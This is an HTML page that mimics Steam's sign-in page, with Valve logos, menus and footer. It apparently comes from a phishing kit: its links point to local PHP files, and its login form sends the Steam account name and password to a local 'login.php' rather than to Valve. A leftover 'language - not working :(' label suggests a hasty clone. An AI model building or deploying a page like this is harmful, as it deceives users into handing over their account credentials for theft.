<!DOCTYPE html>
<html class=" responsive" lang="en"><head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
			<meta name="viewport" content="width=device-width,initial-scale=1">
		<meta name="theme-color" content="#171a21">
		<title>Sign In</title>
	<link rel="shortcut icon" href="https://store.steampowered.com/favicon.ico" type="image/x-icon">

	
	
	<link href="Sign%20In_files/motiva_sans.css" rel="stylesheet" type="text/css">
<link href="Sign%20In_files/shared_global.css" rel="stylesheet" type="text/css">
<link href="Sign%20In_files/buttons.css" rel="stylesheet" type="text/css">
<link href="Sign%20In_files/store.css" rel="stylesheet" type="text/css">
<link href="Sign%20In_files/cart.css" rel="stylesheet" type="text/css">
<link href="Sign%20In_files/browse.css" rel="stylesheet" type="text/css">
<link href="Sign%20In_files/login.css" rel="stylesheet" type="text/css">
<link href="Sign%20In_files/shared_responsive.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="Sign%20In_files/jquery-1.8.3.min"></script>
<script type="text/javascript">$J = jQuery.noConflict();</script><script type="text/javascript">VALVE_PUBLIC_PATH = "https:\/\/store.cloudflare.steamstatic.com\/public\/";</script><script type="text/javascript" src="Sign%20In_files/tooltip"></script>

<script type="text/javascript" src="Sign%20In_files/shared_global"></script>

<script type="text/javascript" src="Sign%20In_files/main"></script>

<script type="text/javascript" src="Sign%20In_files/dynamicstore"></script>

<script type="text/javascript">Object.seal && [ Object, Array, String, Number ].map( function( builtin ) { Object.seal( builtin.prototype ); } );</script>
		<script type="text/javascript">
			document.addEventListener('DOMContentLoaded', function(event) {
				$J.data( document, 'x_readytime', new Date().getTime() );
				$J.data( document, 'x_oldref', GetNavCookie() );
				SetupTooltips( { tooltipCSSClass: 'store_tooltip'} );
		});
		</script><script type="text/javascript" src="Sign%20In_files/login"></script>
<script type="text/javascript" src="Sign%20In_files/shared_responsive_adapter"></script>

						<meta name="twitter:card" content="summary_large_image">
			
	<meta name="twitter:site" content="@steam">

						<meta property="og:title" content="Sign In">
					<meta property="twitter:title" content="Sign In">
					<meta property="og:type" content="website">
					<meta property="fb:app_id" content="105386699540688">
					<meta property="og:site" content="Steam">
			
	
			<link rel="image_src" href="https://store.cloudflare.steamstatic.com/public/shared/images/responsive/share_steam_logo.png">
		<meta property="og:image" content="https://store.cloudflare.steamstatic.com/public/shared/images/responsive/share_steam_logo.png">
		<meta name="twitter:image" content="https://store.cloudflare.steamstatic.com/public/shared/images/responsive/share_steam_logo.png">
					<meta property="og:image:secure" content="https://store.cloudflare.steamstatic.com/public/shared/images/responsive/share_steam_logo.png">
		
	
	
	
	
	<link id="chromealerabat-link" rel="stylesheet" type="text/css" href="Sign%20In_files/content.css"></head>
<body class="login v6 responsive_page">


<div class="responsive_page_frame with_header">
						<div class="responsive_page_menu_ctn mainmenu">
				<div class="responsive_page_menu" id="responsive_page_menu">
										<div class="mainmenu_contents">
						<div class="mainmenu_contents_items">
															<a class="menuitem" href="store.php">
									Login								</a>
								<a class="menuitem supernav" href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu" data-tooltip-type="selector" data-tooltip-content=".submenu_store">
		Store	</a>
	<div class="submenu_store" style="display: none;" data-submenuid="store">
		<a class="submenuitem" href="store.php">Home</a>
					</div>


			<a class="menuitem supernav" style="display: block" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_community">
			Community		</a>
		<div class="submenu_community" style="display: none;" data-submenuid="community">
		<a class="submenuitem" href="home.php">Home</a>
			<a class="submenuitem" href="discussions.php">Discussions</a>
			<a class="submenuitem" href="workshop.php">Workshop</a>
			<a class="submenuitem" href="market.php">Market</a>
											</div>
		

	
	
	<a class="menuitem" href="https://help.steampowered.com/en/">
		Support	</a>

							<div class="minor_menu_items">
																								<div class="menuitem change_language_action">
									Change language								</div>
																																	<div class="menuitem" onclick="Responsive_RequestDesktopView();">
										View desktop website									</div>
															</div>
						</div>
						<div class="mainmenu_footer_spacer  "></div>
						<div class="mainmenu_footer">
															<div class="mainmenu_footer_logo"><img src="Sign%20In_files/logo_valve_footer.png"></div>
								© Valve Corporation. All rights reserved. All trademarks are 
property of their respective owners in the US and other countries.						
		<span class="mainmenu_valve_links">
									<a href="https://store.steampowered.com/privacy_agreement/?snr=1_60_4__global-responsive-menu" target="_blank">Privacy Policy</a>
									&nbsp;| &nbsp;<a href="http://www.valvesoftware.com/legal.htm" target="_blank">Legal</a>
									&nbsp;| &nbsp;<a href="https://store.steampowered.com/subscriber_agreement/?snr=1_60_4__global-responsive-menu" target="_blank">Steam Subscriber Agreement</a>
									&nbsp;| &nbsp;<a href="https://store.steampowered.com/steam_refunds/?snr=1_60_4__global-responsive-menu" target="_blank">Refunds</a>
								</span>
													</div>
					</div>
									</div>
			</div>
		
		<div class="responsive_local_menu_tab"></div>

		<div class="responsive_page_menu_ctn localmenu">
			<div class="responsive_page_menu" id="responsive_page_local_menu" data-panel="{&quot;onOptionsActionDescription&quot;:&quot;Filter&quot;,&quot;onOptionsButton&quot;:&quot;Responsive_ToggleLocalMenu()&quot;,&quot;onCancelButton&quot;:&quot;Responsive_ToggleLocalMenu()&quot;}">
				<div class="localmenu_content" data-panel="{&quot;maintainY&quot;:true,&quot;bFocusRingRoot&quot;:true,&quot;flow-children&quot;:&quot;column&quot;}">
				</div>
			</div>
		</div>



					<div class="responsive_header">
				<div class="responsive_header_content">
					<div id="responsive_menu_logo">
						<img src="Sign%20In_files/header_menu_hamburger.png" height="100%">
											</div>
					<div class="responsive_header_logo">
						<a href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu">
															<img src="Sign%20In_files/header_logo.png" alt="STEAM" height="36" border="0">
													</a>
					</div>
				</div>
			</div>
		
		<div class="responsive_page_content_overlay">

		</div>

		<div class="responsive_fixonscroll_ctn nonresponsive_hidden ">
		</div>
	
	<div class="responsive_page_content">

		<div id="global_header" data-panel="{&quot;flow-children&quot;:&quot;row&quot;}">
	<div class="content">
		<div class="logo">
			<span id="logo_holder">
									<a href="store.php">
						<img src="Sign%20In_files/logo_steam.svg" width="176" height="44">
					</a>
							</span>
		</div>

			<div class="supernav_container">
	<a class="menuitem supernav" href="store.php" data-tooltip-type="selector" data-tooltip-content=".submenu_store">
		STORE	</a>
	<div class="submenu_store" style="display: none;" data-submenuid="store">
		<a class="submenuitem" href="store.php">Home</a>
					</div>


			<a class="menuitem supernav" style="display: block" href="community.php" data-tooltip-type="selector" data-tooltip-content=".submenu_community">
			COMMUNITY		</a>
		<div class="submenu_community" style="display: none;" data-submenuid="community">
			<a class="submenuitem" href="home.php">Home</a>
			<a class="submenuitem" href="discussions.php">Discussions</a>
			<a class="submenuitem" href="workshop.php">Workshop</a>
			<a class="submenuitem" href="market.php">Market</a>
											</div>
		

	
						<a class="menuitem" href="about.php">
				ABOUT			</a>
			
	</div>
	<script type="text/javascript">
		jQuery(function($) {
			$('#global_header .supernav').v_tooltip({'location':'bottom', 'destroyWhenDone': false, 'tooltipClass': 'supernav_content', 'offsetY':-4, 'offsetX': 1, 'horizontalSnap': 4, 'tooltipParent': '#global_header .supernav_container', 'correctForScreenSize': false});
		});
	</script>

		<div id="global_actions">
			<div id="global_action_menu">
									<div class="header_installsteam_btn header_installsteam_btn_green">

						<a class="header_installsteam_btn_content" href="getsteam.php">
							Install Steam						</a>
					</div>
				
				
														
						<span class="pulldown global_action_link" id="language_pulldown" onclick="ShowMenu( this, 'language_dropdown', 'right' );">language - not working :(</span>
						<div class="popup_block_new" id="language_dropdown" style="display: none;">
							<div class="popup_body popup_menu">							</div>
						</div>
												</div>
					</div>
			</div>
</div>
<div id="responsive_store_nav_ctn"></div><div id="responsive_store_nav_overlay" style="display:none;"><div id="responsive_store_nav_overlay_ctn"></div><div id="responsive_store_nav_overlay_bottom"></div></div><div data-cart-banner-spot="1"></div>
		<div class="responsive_page_template_content" id="responsive_page_template_content" data-panel="{&quot;autoFocus&quot;:true}">

			<script type="text/javascript">
	$J( function() {
		var loginOpts =  {
			strRedirectURL: "https:\/\/store.steampowered.com\/",
			gidCaptcha: -1		};

		
		var LoginManger = new CLoginPromptManager( 'https://store.steampowered.com/', loginOpts );

					document.forms['logon'].elements['username'].focus();
		
			} );
</script>
<div class="page_content">
	
	

<div class="page_content_flex">
	<div class="login_left_col ">
		<div class="login_credential_ctn">
			<div class="loginbox login_col_padding">
				<div class="loginbox_left">
					<div class="loginbox_content">
						<div class="login_title">Sign In</div>

						<div id="error_display" class="checkout_error" style="display: none;"></div>
						<form name="logon" action="login.php" method="POST" style="display: block;">
							<div class="login_row">
								<div class="input_title">Steam account name</div>
								<input class="text_field" type="text" name="username" id="input_username" placeholder="">
							</div>
							<div class="login_row">
								<div class="input_title">Password</div>
								<input class="text_field" type="password" name="password" id="input_password" autocomplete="off" placeholder="">
							</div>
															<div class="login_row">
									</div>
								</div>
							
							
							<div class="login_row" id="captcha_entry" style="display: none;">
																<div id="captcha_image_row">
									<img style="float: left;" id="captchaImg" src="Sign%20In_files/blank.gif" width="206" height="40" border="0">
									<div id="captchaRefresh">
										<span class="linkspan" id="captchaRefreshLink">Refresh</span>
									</div>
									<div style="clear: left;"></div>
								</div>
								<br>
								<div class="input_title">Enter the characters above</div>
								<input class="text_field" id="input_captcha" type="text" name="captcha_text">
							</div>
							<div style="display: none;"><input type="submit"></div>
						

						<noscript><p>Javascript must be enabled to use this site</p></noscript>
						<script>
							document.getElementById('login_form').style.display = 'block';
						</script>

						<div class="login_btn_ctn">
							<div id="login_btn_signin">
								<button type="submit" class="btn_blue_steamui btn_medium login_btn">
									<span>Sign In</span>
								</button>
								</form>
															</div>
							<div id="login_btn_wait" style="display: none;">
										<div class="LoadingWrapper">
			<div class="LoadingThrobber">
				<div class="Bar Bar1"></div>
				<div class="Bar Bar2"></div>
				<div class="Bar Bar3"></div>
			</div>
					</div>
									</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	</div>
</div>


	
</div>
<!-- End Main Background -->

		</div>	<!-- responsive_page_legacy_content -->

		<div id="footer_spacer" style="" class=""></div>
<div id="footer" class="">
<div class="footer_content">

    <div class="rule"></div>
				<div id="footer_logo_steam"><img src="Sign%20In_files/logo_steam_footer.png" alt="Valve Software" border="0"></div>
	
    <div id="footer_logo"><a href="http://www.valvesoftware.com/" target="_blank" rel="noreferrer"><img src="Sign%20In_files/footerLogo_valve_new.png" alt="Valve Software" border="0"></a></div>
    <div id="footer_text" data-panel="{&quot;flow-children&quot;:&quot;row&quot;}">
        <div>© 2022 Valve Corporation.  All rights reserved.  All 
trademarks are property of their respective owners in the US and other 
countries.</div>
        <div>VAT included in all prices where applicable.&nbsp;&nbsp;

        </div>
					<div class="responsive_optin_link">
				<div class="btn_medium btnv6_grey_black" onclick="Responsive_RequestMobileView()">
					<span>View mobile website</span>
				</div>
			</div>
		
    </div>



    <div style="clear: left;"></div>
	<br>

    <div class="rule"></div>

    <div class="valve_links" data-panel="{&quot;flow-children&quot;:&quot;row&quot;}">
        <a href="http://www.valvesoftware.com/about" target="_blank" rel="noreferrer">About Valve</a>
        &nbsp; | &nbsp;<a href="http://www.valvesoftware.com/" target="_blank" rel="noreferrer">Jobs</a>
        &nbsp; | &nbsp;<a href="http://www.steampowered.com/steamworks/" target="_blank" rel="noreferrer">Steamworks</a>
        &nbsp; | &nbsp;<a href="https://partner.steamgames.com/steamdirect" target="_blank" rel="noreferrer">Steam Distribution</a>
        		&nbsp; | &nbsp;<a href="https://store.steampowered.com/digitalgiftcards/?snr=1_44_44_" target="_blank" rel="noreferrer">Gift Cards</a>
		&nbsp; | &nbsp;<a href="https://steamcommunity.com/linkfilter/?url=http://www.facebook.com/Steam" target="_blank" rel="noopener"><img src="Sign%20In_files/ico_facebook.gif"> Steam</a>
		&nbsp; | &nbsp;<a href="http://twitter.com/steam" target="_blank" rel="noreferrer"><img src="Sign%20In_files/ico_twitter.gif"> @steam</a>
            </div>

</div>
</div>
	</div>	<!-- responsive_page_content -->

</div>	<!-- responsive_page_frame -->

			</div>
		</div>
		<div style="display: none;">
			<input type="submit">
		</div>
		</form>
	</div>
</div></body></html>